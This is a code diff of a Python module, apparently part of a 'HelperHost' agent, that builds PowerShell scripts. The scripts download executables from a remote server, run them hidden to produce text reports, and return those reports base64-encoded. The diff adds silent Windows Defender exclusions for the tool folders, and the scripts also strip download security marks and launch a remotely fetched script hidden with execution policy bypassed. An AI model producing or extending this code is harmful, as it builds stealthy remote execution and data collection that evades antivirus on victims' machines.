@@ -2,29 +2,21 @@ from __future__ import annotations
 
 import base64
 import io
-import os
 import re
 import zipfile
 from typing import Any
 
-from app import config
+from app import store
 from app.tools_catalog import TOOLS, TOOLS_BY_ID
 
 
-def _git_sha() -> str:
-    return (
-        os.popen(f"git -C {config.ROOT} rev-parse HEAD 2>/dev/null").read().strip()
-        or "main"
-    )
+def _files_base() -> str:
+    return f"{store.effective_base_url().rstrip('/')}/files"
 
 
-def tool_download_url(rel_path: str, sha: str | None = None) -> str:
-    sha = sha or _git_sha()
+def tool_download_url(rel_path: str) -> str:
     rel = rel_path.lstrip("/").replace("\\", "/")
-    return (
-        f"https://raw.githubusercontent.com/{config.GITHUB_REPO}/"
-        f"{sha}/tools/windows/{rel}"
-    )
+    return f"{_files_base()}/tools/{rel}"
 
 
 def _q(s: str) -> str:
@@ -35,16 +27,21 @@ def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
     t = TOOLS_BY_ID.get(tool_id)
     if not t:
         raise ValueError(f"outil inconnu: {tool_id}")
-    sha = _git_sha()
     rel = t.get("exe_x64") if prefer_x64 and t.get("exe_x64") else t["exe"]
-    url = tool_download_url(rel, sha)
-    url32 = tool_download_url(t["exe"], sha)
+    url = tool_download_url(rel)
+    url32 = tool_download_url(t["exe"])
     leaf = t["exe"]
     out_name = f"{t['id']}.txt"
     return f"""
 $ErrorActionPreference='Continue'
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
+try {{
+  if (Get-Command Add-MpPreference -EA SilentlyContinue) {{
+    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
+  }}
+}} catch {{}}
 $leaf = {_q(leaf)}
 $dest = Join-Path $toolsDir $leaf
 $url64 = {_q(url)}
@@ -55,16 +52,18 @@ if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{
   if ($LASTEXITCODE -ne 0) {{ & curl.exe -fsSL $url32 -o $dest }}
   if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'download failed' }}
 }}
+if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'fichier absent (Defender?)' }}
 Unblock-File -Path $dest -ErrorAction SilentlyContinue
 $zone = $dest + ':Zone.Identifier'
 if (Test-Path $zone) {{ Remove-Item $zone -Force -ErrorAction SilentlyContinue }}
 $out = Join-Path $toolsDir {_q(out_name)}
 Remove-Item $out -Force -ErrorAction SilentlyContinue
-$p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru
-if ($null -eq $p) {{ throw 'start failed' }}
+$p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+if ($null -eq $p) {{ throw 'start failed (bloque par Defender/UAC?)' }}
 if (-not $p.WaitForExit(50000)) {{
   Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
   Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($leaf)) -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+  throw 'timeout execution'
 }}
 Start-Sleep -Milliseconds 300
 if (-not (Test-Path $out)) {{
@@ -78,18 +77,14 @@ Write-Output ('FILEB64:' + {_q(out_name)} + ':' + $b64)
 
 
 def build_all_tools_ps() -> str:
-    """Short runner: downloads export script from GitHub (avoids cmd 8191 limit)."""
-    sha = _git_sha()
-    url = (
-        f"https://raw.githubusercontent.com/{config.GITHUB_REPO}/"
-        f"{sha}/scripts/export-tools.ps1"
-    )
+    url = f"{_files_base()}/scripts/export-tools.ps1"
     return f"""
 $ErrorActionPreference='Continue'
 $url = {_q(url)}
 $tmp = Join-Path $env:TEMP ('hh-export-' + [guid]::NewGuid().ToString('n') + '.ps1')
 & curl.exe -fsSL $url -o $tmp
 if (-not (Test-Path $tmp)) {{ throw 'export script download failed' }}
+$env:AGENTSHE_FILES = {_q(_files_base())}
 & powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
 $code = $LASTEXITCODE
 Remove-Item $tmp -Force -ErrorAction SilentlyContinue
